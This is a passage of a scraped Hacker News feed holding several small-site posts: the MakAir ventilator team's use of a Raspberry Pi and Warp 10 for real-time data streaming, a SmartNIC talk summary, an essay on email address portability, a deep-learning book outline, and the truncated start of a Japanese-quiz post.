<figure><ul><li><figure><img loading="lazy" width="1024" height="682" src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-1024x682.jpg" alt="" data-id="11640" data-link="https://blog.senx.io/?attachment_id=11640" srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-1024x682.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336-600x400.jpg 600w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6336.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The first prototype board...</figcaption></figure></li><li><figure><img loading="lazy" width="1024" height="682" src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-1024x682.jpg" alt="" data-id="11641" data-link="https://blog.senx.io/?attachment_id=11641" srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-1024x682.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337-600x400.jpg 600w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6337.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Stacking a Nucleo F411 with pressure sensor, keyboard, screen.</figcaption></figure></li><li><figure><img loading="lazy" width="1024" height="768" src="https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c.jpeg" alt="" data-id="11748" data-full-url="https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c.jpeg" data-link="https://blog.senx.io/?attachment_id=11748" srcset="https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c.jpeg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c-300x225.jpeg 300w, https://blog.senx.io/wp-content/uploads/2020/09/4C103809-C6CC-423D-B054-48B8C853F29E_1_105_c-768x576.jpeg 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>First wood prototype</figcaption></figure></li></ul></figure>



<h2>Enters the Raspberry Pi</h2>



<p>What we learned from the first test on a pig:</p>



<ul><li>The ventilator did the job. The pig was alive and woke up correctly.</li><li><strong>There is a huge UX problem.</strong></li><li>The air flow measurement is really helpful.</li></ul>



<p>The experts from the medical world are now used to high-tech screens displaying curves with not only pressure, but real-time air volume blown into the patient lungs. Even in crisis time, we understand that our product does not meet their minimum UI/UX needs.</p>



<figure><img loading="lazy" width="1024" height="418" src="https://blog.senx.io/wp-content/uploads/2020/09/image-4-1024x418.jpg" alt="difference of UX between first MakAir screen and a recent ventilator" srcset="https://blog.senx.io/wp-content/uploads/2020/09/image-4-1024x418.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/image-4-300x123.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/image-4-768x314.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/image-4-1536x627.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/image-4.jpg 1660w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Makair prototype on the left, a recent ventilator on the right. <br>Both can save life, but UX gap is huge!</figcaption></figure>



<p>Always listen to the users. Even if we succeed in mass production of an open-source ventilator, if doctors want curves and measure of the number of air liters entering the lungs, we must do it. </p>



<p>Since the beginning, this project is time driven. We never consider the price, but we always look at worldwide stocks. In a time where lots of plants are closed in Europe, <strong>the supply chain is leading the project.</strong></p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited.jpg" alt="inside the v1 of the MakAir" width="522" height="347" srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited.jpg 1378w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-1024x683.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6374-edited-600x400.jpg 600w" sizes="(max-width: 522px) 100vw, 522px"><figcaption>Scooter lead-acid batteries. Because these are the most available batteries in the word.</figcaption></figure></div>



<p>So, what is the world's most available touch screen? </p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/image-2.png" alt="farnell stocks" width="616" height="217" srcset="https://blog.senx.io/wp-content/uploads/2020/09/image-2.png 832w, https://blog.senx.io/wp-content/uploads/2020/09/image-2-300x106.png 300w, https://blog.senx.io/wp-content/uploads/2020/09/image-2-768x270.png 768w" sizes="(max-width: 616px) 100vw, 616px"><figcaption>(and 18000 more at radiospares)</figcaption></figure></div>



<p>As I just said, the supply chain rules the project. MakAir will have a raspberry to display curves. Nice coincidence for an open-source project!</p>



<p>By the way, the mass flow meter sensor was a huge problem. Since the beginning, MakAir did not want to disturb the production of existing ventilators. But this component is on the air way, it should be approved for medical use. In April, it was impossible to source any Sensirion or Honeywell mass flow sensors... Anyway, the next test will be done with a raspberry connected to the STM32. </p>







<h2>Enter Warp&nbsp;10</h2>



<p>On the 17th of April, the first batch of ventilators built in the CEA clean-rooms was ready. This batch was used for the 1st clinical tests. </p>



<p><strong>The pressure switches from the technical team to the regulatory team, remotely working on the project since the beginning. </strong></p>



<p>To prepare the next batch, we came back to Nantes. After 25 days, we switched from commando mode (18h/day, 7 days a week) to a more standard week (14h/day, the weekends with the family).</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-1024x768.jpg" alt="MakAir team in the CEA cleanroom with prototypes" width="521" height="390" srcset="https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-1024x768.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-300x225.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-768x576.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752-1536x1152.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_5752.jpg 2016w" sizes="(max-width: 521px) 100vw, 521px"><figcaption>Tyvek sterile clothing in a cleanroom. Could not be better for medical device assembly. Thanks to the CEA.</figcaption></figure></div>



<p>On the 30<sup>th</sup> of April, the prototype with a raspberry pi is ready for the next animal test. Two people had to fly to Grenoble CEA with this prototype, but the rest of us, and all the people remotely working on the project wanted to follow the experience. </p>



<p>So, the night before the test, I quickly deployed Warp&nbsp;10 on the raspberry and wrote a small script to copy data every 10s to another Warp&nbsp;10 server.</p>



<p>What is <a href="https://www.warp10.io/" target="_blank" rel="noreferrer noopener">Warp&nbsp;10</a>? It is a time series platform. But unlike other TSDB (Time Series Database), there is a full analysis environment behind, and even a task scheduler. Compress time series, replicate to another server while managing network outage is really easy. Same tooling on the server and the connected object, that what I call easy IoT. To stream data, you just need a few WarpScript functions among <a href="https://www.warp10.io/doc/functionList" target="_blank" rel="noreferrer noopener">the thousand available</a>.</p>



<p>Basically, the WarpScript pseudo code is:</p>



<pre><code>- Read the last value of makair.lastupload GTS
- take the last tick as start
- take now as end
- fetch locally all the makair GTS from start to end
- WRAP all the GTS
- build a script that UNWRAP and UPDATE the data
- do a remote execution of the script with REXEC 
- if the REXEC was a success, store end in makair.lastupload</code></pre>



<p>You can follow the <a href="https://www.warp10.io/content/04_Tutorials/01_WarpScript/30_Server_to_Server" target="_blank" rel="noreferrer noopener">server to server tutorial</a> to implement such a WarpScript, then save it as $WARP10HOME/warpscripts/makair/10000/upload_data.mc2 to schedule an execution every 10s.</p>



<p>To display data in real-time, <a href="http://studio.senx.io/" target="_blank" rel="noreferrer noopener">WarpStudio</a> did the job easily too. Autorefresh of the DataViz every 10s is a built-in function:</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/image-3.png" alt="autorefresh settings of the MakAir test" width="522" height="385" srcset="https://blog.senx.io/wp-content/uploads/2020/09/image-3.png 575w, https://blog.senx.io/wp-content/uploads/2020/09/image-3-300x221.png 300w" sizes="(max-width: 522px) 100vw, 522px"><figcaption>In the dataviz tab of WarpStudio.</figcaption></figure></div>







<p>Around 30 lines of code to allow all the MakAir team to follow the pressure inside the pig lungs in real-time!</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-1024x683.jpg" alt="real time display" width="516" height="343" srcset="https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-1024x683.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-2048x1365.jpg 2048w, https://blog.senx.io/wp-content/uploads/2020/09/DSC_6580-70pc-600x400.jpg 600w" sizes="(max-width: 516px) 100vw, 516px"><figcaption>WarpStudio on a 60" 4k display, that's a nice dashboard.</figcaption></figure></div>







<h2>Next steps</h2>



<p>MakAir ventilators are designed to store everything in the <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp&nbsp;10</a> time series database. They also have built-in WiFi and LoRa. All these features are not yet available, because the priority is still to make an open-source approved ventilator. </p>



<figure><ul><li><figure><img loading="lazy" width="225" height="300" src="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-225x300.jpg" alt="" data-id="11728" data-full-url="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-scaled.jpg" data-link="https://blog.senx.io/?attachment_id=11728" srcset="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-225x300.jpg 225w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-768x1024.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-1152x1536.jpg 1152w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-1536x2048.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171307-scaled.jpg 1920w" sizes="(max-width: 225px) 100vw, 225px"><figcaption>Revision 3 has a Raspberry screen on top of the small screen.</figcaption></figure></li><li><figure><img loading="lazy" width="225" height="300" src="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-225x300.jpg" alt="" data-id="11727" data-full-url="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-scaled.jpg" data-link="https://blog.senx.io/?attachment_id=11727" srcset="https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-225x300.jpg 225w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-768x1024.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-1152x1536.jpg 1152w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-1536x2048.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/09/IMG_20200519_171259-scaled.jpg 1920w" sizes="(max-width: 225px) 100vw, 225px"><figcaption>The Raspberry Pi connected to the mainboard</figcaption></figure></li></ul></figure>



<p>Connected features + open-source software is an enabler for doctors and researchers to perform extensive data collection and try new algorithms in the machine. Warp&nbsp;10 is the best open source time series database to <a href="https://blog.senx.io/warp-10-for-iot-gdpr-compliant-before-gdpr-even-existed/" target="_blank" rel="noreferrer noopener">securely</a> store medical data and analyze it. It's not a walled garden.</p>



<p>If you need to connect medical devices to a time series database, <a href="mailto:contact@senx.io" target="_blank" rel="noreferrer noopener">just ask us</a>.</p>



<p>MakAir is now entering the second phase of clinical tests. We can consider we are half way to the goal. Keep in mind that among all the projects of ventilators announced by big companies, MakAir is the only one to reach the clinical tests step. <a href="https://makair.life/" target="_blank" rel="noreferrer noopener">200 people, backed up by CEA and a few french companies</a> are about to make a commercially available open source ventilator... </p>



<p>That's crazy when you think about it!</p>




<!-- relpost-thumb-wrapper --><!-- close relpost-thumb-wrapper -->      
           
    </article></div>]]>
            </description>
            <link>https://blog.senx.io/makair-covid-19-ventilator-with-a-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24589853</guid>
            <pubDate>Fri, 25 Sep 2020 14:08:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SmartNICs and SmartSSDs, the Future of Smart Acceleration]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24589841">thread link</a>) | @kungfudoi
<br/>
September 25, 2020 | https://technologyevangelist.co/2020/09/25/smartnics-and-smartssds-the-future-of-smart-acceleration/ | <a href="https://web.archive.org/web/*/https://technologyevangelist.co/2020/09/25/smartnics-and-smartssds-the-future-of-smart-acceleration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
			
		<div>
		<main id="main" role="main">

					<div>
				
<article id="post-4780">
	<!-- .entry-header -->

	<div>
		
<figure><img data-attachment-id="4786" data-permalink="https://technologyevangelist.co/2020/09/25/smartnics-and-smartssds-the-future-of-smart-acceleration/u25sketch/#main" data-orig-file="https://i1.wp.com/technologyevangelist.co/wp-content/uploads/2020/09/U25Sketch.png?fit=582%2C323&amp;ssl=1" data-orig-size="582,323" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="U25Sketch" data-image-description="" data-medium-file="https://i1.wp.com/technologyevangelist.co/wp-content/uploads/2020/09/U25Sketch.png?fit=300%2C166&amp;ssl=1" data-large-file="https://i1.wp.com/technologyevangelist.co/wp-content/uploads/2020/09/U25Sketch.png?fit=582%2C323&amp;ssl=1" loading="lazy" width="582" height="323" src="https://i1.wp.com/technologyevangelist.co/wp-content/uploads/2020/09/U25Sketch.png?resize=582%2C323&amp;ssl=1" alt="" srcset="https://i1.wp.com/technologyevangelist.co/wp-content/uploads/2020/09/U25Sketch.png?w=582&amp;ssl=1 582w, https://i1.wp.com/technologyevangelist.co/wp-content/uploads/2020/09/U25Sketch.png?resize=300%2C166&amp;ssl=1 300w, https://i1.wp.com/technologyevangelist.co/wp-content/uploads/2020/09/U25Sketch.png?resize=150%2C83&amp;ssl=1 150w" sizes="(max-width: 582px) 100vw, 582px" data-recalc-dims="1"><figcaption>Block Diagram for Xilinx‚Äôs U25 SmartNIC</figcaption></figure>



<p>For the past three years, I‚Äôve been writing about SmartNICs. One of my most popular blog posts is ‚Äú<a href="https://technologyevangelist.co/2017/07/17/whats-a-smart-nic/">What is a SmartNIC</a>‚Äù from July 2017, which has been read over 6,000 times. This year, for the second time, I‚Äôve presented at the Storage Developer Conference (SDC). The title for this blog post was also the title of my <a href="https://www.youtube.com/watch?v=kGmo3M0vLsI">breakout session video</a>, which ran for 50 minutes, and went live earlier this week. Here is the abstract for that session:</p>



<blockquote><p>Since the advent of the Smart Phone over a decade ago, we‚Äôve seen several new ‚ÄúSmart‚Äù technologies, but few have had a significant impact on the data center until now. SmartNICs and SmartSSDs will change the landscape of the data center, but what comes next? This talk will summarize the state of the SmartNIC market by classifying and discussing the technologies behind the leading products in the space. Then it will dive into the emerging technology of SmartSSDs and how they will change the face of storage and solutions. Finally, we‚Äôll dive headfirst into the impact of PCIe 5 and Compute Express Link (CXL) on the future of Smart Acceleration on solution delivery.</p><cite>‚Äî<a href="https://www.snia.org/events/storage-developer/2020/abstracts#computational-Schweitzer">Scott Schweitzer</a>, The Technology Evangelist, Xilinx, Sept 2020</cite></blockquote>



<p>In that talk, which has been seen by over 100 people in just the first 24-hours alone on YouTube (I‚Äôm told this doesn‚Äôt include conference attendees), I shared much of what I‚Äôve learned over the past few months while producing the following new items on SmartNICs:</p>



<ul><li>My fourth Electronic Design (ED) article on September 13th is titled ‚Äú<a href="https://www.electronicdesign.com/industrial-automation/article/21141015/how-pcie-5-with-cxl-ccix-and-smartnics-will-change-solution-acceleration">How PCIe 5 with CXL, CCIX, and SmartNICs Will Change Solution Acceleration</a>.‚Äù This piece touches on some of the new high-level protocols which will make Smart Accelerators even more performant.  </li><li>Hosting an IEEE Hot Interconnects Panel on August 19th titled: ‚Äú<a rel="noreferrer noopener" href="https://www.youtube.com/watch?v=8mJi3nIgPkU" target="_blank">SmartNICs vs. DPUs, Who Wins?</a>‚Äù Over 225 people originally attended this talk, and the video has since been viewed another 300 times. We were fortunate enough to secure critical people from all the major SmartNIC companies, except Intel, for an extremely lively discussion. I also did a&nbsp;<a rel="noreferrer noopener" href="https://technologyevangelist.co/2020/08/25/smartnics-vs-dpus/" target="_blank">blog post</a>&nbsp;on this last month.  </li><li>The third article for ED on SmartNICs published on July 10th with the title ‚Äú<a href="https://www.electronicdesign.com/industrial-automation/article/21136402/smartnic-architectures-a-shift-to-accelerators-and-why-fpgas-are-poised-to-dominate">SmartNIC Architectures: A Shift to Accelerators and Why FPGAs are Poised to Dominate</a>.‚Äù This article offers up a pretty comprehensive overview of the technologies in the market today from the leading companies.</li><li>The second article for ED on June 29th, ‚Äú<a href="https://www.electronicdesign.com/industrial-automation/article/21134459/why-is-a-smartnic-better-than-a-regular-nic">Why is a SmartNIC Better than a Regular NIC?</a>‚Äú</li><li>My first article for ED on June 4th, ‚Äú<a href="https://www.electronicdesign.com/industrial-automation/article/21133216/what-makes-a-smartnic-smart">What Makes a SmartNIC Smart?</a>‚Äú</li></ul>



<p>And there‚Äôs more to come‚Ä¶</p>




			</div><!-- .entry-content -->

	<!-- .entry-meta -->
</article><!-- #post-## -->
			</div>

				<nav role="navigation" id="nav-below">
		

	
				
	
	</nav><!-- #nav-below -->
	
			
<!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->

					<!-- #secondary -->
	
	</div></div>]]>
            </description>
            <link>https://technologyevangelist.co/2020/09/25/smartnics-and-smartssds-the-future-of-smart-acceleration/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24589841</guid>
            <pubDate>Fri, 25 Sep 2020 14:07:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[People should be able to legally port their email address to another service]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24589817">thread link</a>) | @kioleanu
<br/>
September 25, 2020 | https://viorel.me/2020/2020-09-25-you-should-be-able-to-legally-port-your-email-address/ | <a href="https://web.archive.org/web/*/https://viorel.me/2020/2020-09-25-you-should-be-able-to-legally-port-your-email-address/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
		<p><span>Written by</span>
        Viorel
        <br>
        <span>on&nbsp;</span><time datetime="2020-09-25 12:00:18 +0000 UTC">September 25, 2020</time>
</p>
		


		

		

<p>I‚Äôve had my ‚Äúofficial‚Äù personal email address for 14 years now. I use it everywhere, it speaks my name, but it now unfortunately has to go wherever email addresses go when they‚Äôre not used anymore.</p>

<p>The main reason why I‚Äôm letting my e-mail address go is because I don‚Äôt own it, I can‚Äôt rent it and I‚Äôm only <em>allowed</em> to use it. And it‚Äôs connected to basically every service I use, especially my banking or utilities or shopping. My doctors send me notes to my e-mail address. It controls my entire online presence. And it can be taken away without reason or appeal.</p>

<p>It‚Äôs also the worst kind of vendor lock-in. I‚Äôve created and used this address many years before the company decided they‚Äôd better business if they peaked through my e-mails and saved them in a weirdly structured way, which they may or may not sell to other people.</p>

<p>I also don‚Äôt own my phone number but, as opposed to my e-mail address</p>

<p>Which leads me to:</p>

<h3 id="we-should-be-able-to-port-our-e-mail-addresses-the-same-way-we-port-telephone-numbers">We should be able to port our e-mail addresses the same way we port telephone numbers</h3>

<p>There‚Äôre various levels of legislation about what <em>e-mails</em> one can receive, but nothing about actual e-mail <em>addresses</em>. There‚Äôs nothing protecting the user in that regard. Did the small robot at Big E-mail Company decide to block the access to your e-mail address? Tough titty said the kitty.</p>

<p><em>Everybody should be able to change e-mail services without having to change their e-mail address. Companies providing email services should be specifically registered as such, and they should follow a fixed set of rules made to measure the importance e-mail addresses have for users. And this should apply for both paid email services and services that offer various degrees of free plans.</em></p>

<p>It‚Äôs not a technical walk in the park, but not impossible to implement either. Most important, it‚Äôs in the benefit of the user. There‚Äôs no way of having an internet presence without an e-mail address as there‚Äôs no other unique and personal identifier you can use when creating an account anywhere. People have tried usernames and it didn‚Äôt quite work out and phone numbers were not as loved (for some strange reason).</p>

<p>For most email services I tried, you have the possibility of moving the e-mails from other services to them. So it‚Äôs relatively easy to move your emails around, just not your e-mail address.</p>

<h3 id="what-s-the-alternative-right-now">What‚Äôs the alternative right now?</h3>

<p>There‚Äôs only one thing you can do: buy your own domain and use it with an e-mail service. By owning* your domain, you own your e-mail address, and you can take it with you and nobody else has a say in that. But this requires a certain, albeit small, degree of technical savviness: you have to point the domain to the e-mail service.</p>

<p>Once you have your e-mail address, just start shopping for email services and you‚Äôll be pleasantly surprised. It‚Äôs really great choosing what you need and not what‚Äôs given to you: maybe you‚Äôd like your e-mails to be hosted in Europe or you need lots of gigabytes available. Or maybe you just like having a real live person on the other end to talk to when you have problems. Did the service suck after 6 months or didn‚Äôt deliver? Did your needs change? Just move on to another. Should take less than half an hour.</p>

<p>As for me, I‚Äôve started the long road of switching to my new address. I‚Äôm revisiting all my accounts, deleting the ones I don‚Äôt need and updating the other. However, I don‚Äôt think I‚Äôll ever be able to completely delete the old address. 14 years is a long time and there‚Äôs many more people/places that have my address than I can remember. I‚Äôll probably forward that address forever to my new address. Or anyway, until someone, human or not, decides to zap it.</p>

<ul>
<li>You don‚Äôt own a domain either, but, as phone numbers, someone can‚Äôt just take it away</li>
</ul>


		
	</div>

	
</div></div>]]>
            </description>
            <link>https://viorel.me/2020/2020-09-25-you-should-be-able-to-legally-port-your-email-address/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24589817</guid>
            <pubDate>Fri, 25 Sep 2020 14:05:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deep Learning for Programmers book with new chapter Tensor-based neural networks]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24589684">thread link</a>) | @dragandj
<br/>
September 25, 2020 | https://aiprobook.com/deep-learning-for-programmers/?release=0.21.0&src=hn | <a href="https://web.archive.org/web/*/https://aiprobook.com/deep-learning-for-programmers/?release=0.21.0&src=hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="why">
        
        
        
        <p>
          <h4>basically‚Ä¶</h4>



<h4>interactive &amp; dynamic</h4>
<h4>step-by-step implementation</h4>
<h4>incredible performance, yet no C++ hell (!)</h4>
<h4>Intel &amp; AMD CPUs (DNNL)</h4>
<h4>Nvidia GPUs (CUDA and cuDNN)</h4>
<h4>AMD GPUs (yes, OpenCL too!)</h4>
<h4>Clojure (it‚Äôs magic!)</h4>
<h4>Java Virtual Machine (without Java boilerplate!)</h4>
<h4>complete source code</h4>
<h4>beautiful typesetting (see the sample chapters below)</h4>

        </p>
      </div><div id="deep-learning">
        
        
        
        <p>
          

<h4>classic neural networks using fast linear algebra</h4>
<h4>build an optimized backpropagation algorithm step-by-step</h4>
<h4>explore it on the CPU</h4>
<h4>run it on the GPU!</h4>
<h4>design an elegant neural network API</h4>
<h4>add tensor support</h4>
<h4>integrate with Intel‚Äôs DNNL and Nvidia‚Äôs cuDNN performance libraries</h4>
<h4>learn the nuts and bolts</h4>
<h4>build convolutional layers</h4>
<h4>build RNN support</h4>
<h4>understand how to use it to solve practical problems</h4>
<h4>‚Ä¶and much more!</h4>

        </p>
      </div><div id="interactive">
        
        
        
        <p>
          

<h4>see the result of executing each line</h4>
<h4>experiment in a live environment</h4>

<h4>no C++ build hell</h4>

<h3>no C++ syntax hell!</h3>

<h4>Java Virtual Machine, but without Java boilerplate</h4>

<h4>Clojure, the nicest language on earth :-)</h4>



        </p>
      </div><div id="contents">
        
        
        
        <div>
          <h2>Table of Contents</h2>

<h3>Part 1: Getting Started</h3>

<p>2-4 chapters, (TO BE DETERMINED, once other parts are complete)</p>

<h3>Part 2: Inference (<a href="https://www.patreon.com/deep_learning?ref=20">AVAILABLE</a>)</h3>

<h4>Representing layers and connections (<a href="https://www.patreon.com/deep_learning?ref=21">AVAILABLE</a>)</h4>

<h4>Bias and activation function (<a href="https://www.patreon.com/deep_learning/?ref=22">AVAILABLE</a>)</h4>

<h4>Fully connected inference layers (<a href="https://www.patreon.com/deep_learning?ref=23">AVAILABLE</a>)</h4>

<h4>Increasing performance with batch processing (<a href="https://www.patreon.com/deep_learning?ref=24">AVAILABLE</a>)</h4>

<h4>Sharing memory (<a href="https://www.patreon.com/deep_learning?ref=25">AVAILABLE</a>)</h4>

<h4>GPU computing with CUDA and OpenCL (<a href="https://www.patreon.com/deep_learning?ref=26">AVAILABLE</a>)</h4>

<h3>Part 3: Learning (<a href="https://www.patreon.com/deep_learning?ref=30">AVAILABLE</a>)</h3>

<h4>Gradient descent and backpropagation (<a href="https://www.patreon.com/deep_learning?ref=31">AVAILABLE</a>)</h4>

<h4>The forward pass (<a href="https://www.patreon.com/deep_learning?ref=32">AVAILABLE</a>)</h4>

<h4>The activation and its derivative (<a href="https://www.patreon.com/deep_learning?ref=33">AVAILABLE</a>)</h4>

<h4>The backward pass (<a href="https://www.patreon.com/deep_learning?ref=34">AVAILABLE</a>)</h4>

<h3>Part 4: A simple neural networks API (<a href="https://www.patreon.com/deep_learning?ref=40">AVAILABLE</a>)</h3>

<h4>Inference API (<a href="https://www.patreon.com/deep_learning?ref=41">AVAILABLE</a>)</h4>

<h4>Training API (<a href="https://www.patreon.com/deep_learning?ref=42">AVAILABLE</a>)</h4>

<h4>Initializing weights (<a href="https://www.patreon.com/deep_learning?ref=43">AVAILABLE</a>)</h4>

<h4>Regression: learning a known function (<a href="https://www.patreon.com/deep_learning?ref=44">AVAILABLE</a>)</h4>

<h3>Part 5: Training optimizations (AVAILABLE)</h3>

<h4>Weight decay (<a href="https://www.patreon.com/deep_learning?ref=51">AVAILABLE</a>)</h4>

<h4>Momentum and Nesterov momentum (<a href="https://www.patreon.com/deep_learning?ref=52">AVAILABLE</a>)</h4>

<h4>Adaptive learning rates (<a href="https://www.patreon.com/deep_learning?ref=53">AVAILABLE</a>)</h4>

<h4>Regression: Boston housing prices (<a href="https://www.patreon.com/deep_learning?ref=54">AVAILABLE</a>)</h4>

<h4>Dropout (<a href="https://www.patreon.com/deep_learning?ref=55">AVAILABLE</a>)</h4>

<h4>Stochastic gradient descent (<a href="https://www.patreon.com/deep_learning?ref=56">AVAILABLE</a>)</h4>

<h4>Classification: IMDB sentiments (<a href="https://www.patreon.com/deep_learning?ref=57">AVAILABLE</a>)</h4>

<h3>Part 6: Tensors (<a href="https://www.patreon.com/deep_learning?ref=60">AVAILABLE</a>)</h3>

<h4>Classification and metrics: MNIST handwritten digits recognition (<a href="https://www.patreon.com/deep_learning?ref=61">AVAILABLE</a>)</h4>

<h4>Tensors and ND arrays (<a href="https://www.patreon.com/deep_learning?ref=62">AVAILABLE</a>)</h4>

<h4>Tensor transformations (<a href="https://www.patreon.com/deep_learning?ref=63">AVAILABLE</a>)</h4>

<h4>DNNL: Tensors on the CPU (<a href="https://www.patreon.com/deep_learning?ref=64">AVAILABLE</a>)</h4>

<h4>Tensor-based neural networks (<a href="https://www.patreon.com/deep_learning?ref=65">AVAILABLE</a>)</h4>

<h4>cuDNN: Tensors on the GPU (SOON)</h4>

<h3>Part 7: Convolutional networks (SOON)</h3>

<h4>Convolutional layers (SOON)</h4>
<h4>Image recognition: Fashion-MNIST (SOON)</h4>
<h4>1-2 additional chapters, (SOON)</h4>

<h3>Part 8: Recurrent networks (In 2nd edition of the book, 2021)</h3>

        </div>
      </div></div>]]>
            </description>
            <link>https://aiprobook.com/deep-learning-for-programmers/?release=0.21.0&amp;src=hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-24589684</guid>
            <pubDate>Fri, 25 Sep 2020 13:53:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cumulative Daily Quizzes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24589620">thread link</a>) | @sova
<br/>
September 25, 2020 | https://learn-japanese.org/2020/09/25/introducing-streaks-and-the-cumulative-quiz/ | <a href="https://web.archive.org/web/*/https://learn-japanese.org/2020/09/25/introducing-streaks-and-the-cumulative-quiz/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
	<p><a href="#content">Skip to content</a></p><!-- #masthead -->

	
	<div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-1200">

	

	
			<figure>
